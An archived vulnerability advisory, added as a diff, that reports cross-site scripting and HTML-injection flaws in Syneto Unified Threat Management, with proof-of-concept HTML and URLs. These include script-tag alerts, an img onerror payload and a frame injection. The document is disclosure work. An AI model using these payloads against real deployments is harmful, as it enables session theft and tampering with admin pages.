@@ -1,0 +1,104 @@
+source: http://www.securityfocus.com/bid/51597/info
+
+Syneto Unified Threat Management is prone to multiple cross-site scripting and HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or control how the site is rendered to the user. Other attacks are possible.
+
+Unified Threat Management 1.4.2 and 1.3.3 Community Edition are vulnerable; other versions may be affected. 
+
+Proof of Concept:
+=================
+The vulnerabilities can be exploited by privileged user accounts, lowviewers or remote attackers with required user inter action.
+For demonstration or reproduce ...
+
+1.1.1
+
+[+] Reports - Executive Summery - Output Listing Category
+
+<tr id="list_1" class="tableRowEven">
+<td class="status" valign="top" align="center">
+<a href="#" title="Disable the reporting list" class="disableList"><img src="img/enabled.gif"
+title="disable" alt="disable" class="disable"></a>
+<a style="display: none;" href="#" title="Enable the reporting list" class="enableList">
+<img src="img/disabled.gif" title="enable" alt="enable" class="enable"></a>
+				</td>
+<td valign="top"> "><EXECUTION OF PERSISTENT SCRIPT CODE!>&#039; <<="" td="">
+<td valign="top" nowrap="nowrap">
+<a href="#" id="list_1" class="editList"><img src="img/edit.gif" title="Edit" alt="Edit"
+ /></a>
+<a href="syneto.php?menuid=307&action=delete&id=1" class="deleteList"><
+;img src="img/delete.gif" title="Delete" alt="Delete" /></a>
+</td>
+</tr>
+</tbody>
+	</table>
+	</div>
+
+
+Reference(s):
+https://www.example.com.com/syneto.php?menuid=307
+
+
+
+1.1.2
+[+] EMail - Filter Add & Configure
+
+<div>Sender = >"<EXECUTION OF PERSISTENT SCRIPT CODE!">.*</div>						    							<div>Receiver = .*</div>
+<div>Subject = .*(SPAM|VIAGRA).*</div>
+						
+Reference(s):
+https://www.example.com.com/syneto.php?menuid=63
+
+
+
+1.1.3
+[+] EMail Settings - New Domain
+
+">
+<table class="data" id="smtpDomainsList">
+	<thead>
+		<tr>
+			<th class="status">Status</th>
+			<th class="domain">Domain</th>
+			<th class="routing">Routing</th>
+			<th class="verify_sender">Verify sender</th>
+			<th class="qdm">Send digest</th>
+			<th class="actions">Actions</th>
+		</tr>
+	</thead>
+	<tbody>
+
+<tr id="domain_3" class="tableRowEven editableDomain "><EXECUTION OF PERSISTENT SCRIPt CODE!><td class="status">
+<input name="active" value="1" type="hidden">
+<input name="qdm_enabled" value="" type="hidden">
+<input name="qdm_hours" value="23" type="hidden">
+<input name="admin_email" value=""><script>EXECUTION OF PERSISTENT SCRIPt CODE!</script>" type="hidden">
+<input name="verify_peer" value="" type="hidden">
+<input name="prefix_digest_links" value="" type="hidden"><EXECUTION OF PERSISTENT SCRIPT CODE!>" />
+
+<input name="verify_sender" value="" type="hidden">
+<input name="verify_sender_network_name" value="" type="hidden"><input name="qdm_exceptions" value="" type="hidden">
+<input name="whitelist" value="" type="hidden">
+<input name="blacklist" value="" type="hidden"><img class="clickable tooltip" title="" src="img/enabled.gif">
+</td>
+<td class="domain">"><script>alert(vulnerabilitylab)</script></td>
+
+
+Reference(s):
+https://www.example.com.com/syneto.php?menuid=60
+
+
+
+1.2
+
+PoC:
+https://www.example.com.com/index.php?error=need_login"&#039;><frame src=http://www.vulnerability-lab.com><hr>&from_menu=238
+https://www.example.com.com/index.php?info=%3Cimg%20src=%22%3Cimg%20src=search%22/onerror=alert(%22vulnerabilitylab%22)//%22%3E
+
+
+Reference(s):
+https://www.example.com.com/index.php?error=need_login"&#039;>EXECUTION OF PERSISTENT SCRIPT CODE!<hr>&from_menu=238
+https://www.example.com.com/index.php?info=<EXECUTION OF PERSISTENT SCRIPT CODE!>%20%3E
+
+
+
